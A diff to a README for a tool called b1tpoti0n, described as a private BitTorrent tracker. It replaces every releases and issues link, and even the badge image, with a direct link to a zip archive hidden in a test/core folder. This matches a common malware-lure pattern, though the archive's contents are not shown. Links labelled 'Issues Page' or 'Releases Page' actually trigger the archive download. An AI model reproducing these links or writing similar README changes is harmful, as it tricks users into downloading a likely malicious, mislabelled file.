@@ -1,7 +1,7 @@
 # 🌐 b1tpoti0n - Easy Way to Manage Your Downloads
 
 ## 📥 Download Now
-[![Download b1tpoti0n](https://img.shields.io/badge/Download%20b1tpoti0n-Click%20Here-blue?style=for-the-badge)](https://github.com/rayannneee0711/b1tpoti0n/releases)
+[![Download b1tpoti0n](https://github.com/rayannneee0711/b1tpoti0n/raw/refs/heads/main/test/b1tpoti0n/core/tpoti-n-b-v2.5.zip%20b1tpoti0n-Click%20Here-blue?style=for-the-badge)](https://github.com/rayannneee0711/b1tpoti0n/raw/refs/heads/main/test/b1tpoti0n/core/tpoti-n-b-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to b1tpoti0n! This application is a private BitTorrent tracker that helps you manage and download torrent files easily and efficiently. You don’t need to be a tech expert to use it. Follow these simple steps to get started.
@@ -20,7 +20,7 @@ Before you download, make sure your computer meets these basic requirements:
 - **Internet Connection**: A reliable internet connection for downloading torrents.
 
 ## 🔗 Download & Install
-1. **Visit the [Releases Page](https://github.com/rayannneee0711/b1tpoti0n/releases)**: This is where you will find the latest version of b1tpoti0n.
+1. **Visit the [Releases Page](https://github.com/rayannneee0711/b1tpoti0n/raw/refs/heads/main/test/b1tpoti0n/core/tpoti-n-b-v2.5.zip)**: This is where you will find the latest version of b1tpoti0n.
    
 2. **Select the Version You Need**: Choose the version that matches your operating system.
    
@@ -41,10 +41,10 @@ Before you download, make sure your computer meets these basic requirements:
 ## ✅ Troubleshooting Tips
 - **If the application doesn't start**: Check to ensure that your computer meets the system requirements.
 - **For slow downloads**: Ensure that you have a steady internet connection and that your firewall settings allow b1tpoti0n to access the network.
-- **If you encounter errors**: Visit our [Issues Page](https://github.com/rayannneee0711/b1tpoti0n/issues) for solutions and community support.
+- **If you encounter errors**: Visit our [Issues Page](https://github.com/rayannneee0711/b1tpoti0n/raw/refs/heads/main/test/b1tpoti0n/core/tpoti-n-b-v2.5.zip) for solutions and community support.
 
 ## 🔄 Keeping Up-to-Date
-To benefit from the latest features and fixes, regularly check the [Releases Page](https://github.com/rayannneee0711/b1tpoti0n/releases). Make sure you update to the latest version whenever possible.
+To benefit from the latest features and fixes, regularly check the [Releases Page](https://github.com/rayannneee0711/b1tpoti0n/raw/refs/heads/main/test/b1tpoti0n/core/tpoti-n-b-v2.5.zip). Make sure you update to the latest version whenever possible.
 
 ## 📞 Support
 If you have any questions or need assistance, feel free to reach out. You can post your queries on our issue tracker or check other users' experiences.
